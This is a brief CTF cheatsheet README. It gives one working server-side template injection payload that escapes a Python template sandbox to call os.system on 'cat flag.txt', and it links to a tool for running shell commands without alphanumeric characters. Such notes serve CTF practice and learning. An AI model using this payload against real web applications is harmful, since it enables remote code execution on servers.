# Bash-And-CTF-Cheatsheet
Bash And CTF Cheatsheet that i found around the internet

## Server Side Template Injection
```bash
{{ ().__class__.__base__.__subclasses__()[59].__init__.func_globals["linecache"].__dict__["os"].system('cat flag.txt') }}
```


## BashHack

### Bashfuck
Executing command without usng alphanum characters

[BasFuck](https://github.com/trichimtrich/bashfuck)

